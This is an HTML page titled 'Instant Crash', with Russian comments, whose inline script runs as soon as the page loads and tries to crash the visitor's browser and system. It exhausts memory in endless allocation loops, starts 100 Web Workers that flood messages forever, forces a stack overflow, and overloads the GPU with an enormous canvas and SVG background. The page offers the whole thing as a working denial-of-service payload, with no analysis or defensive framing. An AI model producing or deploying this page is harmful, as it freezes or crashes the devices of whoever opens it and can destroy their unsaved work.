<!DOCTYPE html>
<html>
<head>
<title>Instant Crash</title>
<script>
// КРАШ НА 100%
(function() {
    // 1. Заполняем память неперерабатываемыми объектами
    let storage = [];
    let buffer = [];
    
    function fillRAM() {
        while (true) {
            try {
                // выделяем 1GB за раз
                let mega = new Uint8Array(1024 * 1024 * 100);
                for (let i = 0; i < mega.length; i++) {
                    mega[i] = i % 256;
                }
                storage.push(mega);
                buffer.push(new ArrayBuffer(1024 * 1024 * 10));
            } catch(e) {
                // даже после ошибки продолжаем
                continue;
            }
        }
    }
    
    // 2. Блокируем Web Worker и UI одновременно
    let workers = [];
    for (let w = 0; w < 100; w++) {
        let blob = new Blob([ `self.onmessage = function(e) { while(true) { self.postMessage('${'X'.repeat(100000)}'); } }` ], {type: 'application/javascript'});
        let worker = new Worker(URL.createObjectURL(blob));
        workers.push(worker);
        worker.postMessage('start');
    }
    
    // 3. Переполняем стек вызовов
    function stackOverflow() {
        let hugeArray = new Array(1000000);
        for(let i=0;i<hugeArray.length;i++) hugeArray[i]=i;
        stackOverflow();
    }
    
    // 4. Убиваем GPU через canvas
    let canvas = document.createElement('canvas');
    canvas.width = 500000;
    canvas.height = 500000;
    let ctx = canvas.getContext('2d');
    for(let frame=0; frame<999999; frame++) {
        ctx.fillStyle = `rgb(${frame%256},${frame%256},${frame%256})`;
        ctx.fillRect(0, 0, canvas.width, canvas.height);
    }
    
    setTimeout(fillRAM, 1);
    setTimeout(stackOverflow, 2);
})();
</script>
</head>
<body style="position:fixed;top:0;left:0;right:0;bottom:0;background:url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="999999" height="999999"><rect width="999999" height="999999" fill="black"/></svg>');"></body>
</html>
